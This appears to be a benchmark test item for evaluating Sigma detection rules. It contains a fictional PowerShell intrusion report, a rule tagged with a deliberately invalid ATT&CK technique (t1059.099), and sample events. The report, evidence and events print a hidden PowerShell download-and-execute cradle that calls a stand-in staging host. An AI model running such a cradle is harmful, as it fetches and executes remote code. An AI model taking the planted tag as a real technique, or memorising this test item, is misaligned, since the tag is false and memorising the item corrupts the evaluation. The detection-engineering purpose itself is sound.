@@ -1,0 +1,112 @@
+id: D8-01
+role: defective
+defect_class: D8
+evasive: false
+why: 'The tag attack.t1059.099 is not a real ATT&CK technique: T1059 has no sub-technique .099. The report
+  supports T1059.001 (PowerShell) only; the detection logic and the other metadata are sound.'
+expected_gate: G7
+report_text: 'Incident summary, Harbourline Freight (fictional logistics provider). The intruder''s first
+  execution step on each workstation was a hidden PowerShell one-liner launched from a malicious shortcut
+  file that the user opened from a phishing attachment. The recovered process command line was: powershell.exe
+  -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(''http://stage.harbourline-update.test/a.ps1'')
+  and the parent process was explorer.exe, which is consistent with a user double-clicking the shortcut.
+  The script retrieved a second-stage loader and exited within seconds. The same pattern appeared on three
+  workstations over two days, each time with a different script name on the staging host. No scheduled
+  tasks, services or registry changes were attributed to the actor during this phase, and no other script
+  interpreter was involved. Defenders should therefore focus on the hidden, inline download-and-execute
+  launch rather than on the second-stage payload, which changed per host.'
+evidence:
+- powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://stage.harbourline-update.test/a.ps1')
+- a hidden PowerShell one-liner launched from a malicious shortcut file
+logsource: windows_process_creation
+techniques:
+- T1059.001
+sigma_yaml: |
+  title: Hidden PowerShell Inline Download Cradle
+  id: 3f6c2a1e-8b47-4d09-9a52-7e1c0b5d2f81
+  status: experimental
+  description: Detects a hidden-window PowerShell launch that downloads a remote script inline with Net.WebClient DownloadString.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.099
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\powershell.exe'
+      CommandLine|contains|all:
+        - 'WindowStyle Hidden'
+        - 'Net.WebClient'
+        - 'DownloadString'
+    condition: selection
+  falsepositives:
+    - Administrative scripts that fetch configuration from an internal host with a hidden window
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://stage.harbourline-update.test/a.ps1')
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -nop -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://stage.harbourline-update.test/c9.ps1')
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c ipconfig /all
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\notes.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -WindowStyle Hidden -File C:\Scripts\rotate-logs.ps1
+    parent: C:\Windows\System32\svchost.exe
+    parent_cmd: svchost.exe -k netsvcs
+    user: LAB\svc-backup
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command (New-Object Net.WebClient).DownloadString('http://intranet.harbourline.example/inventory.txt')
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
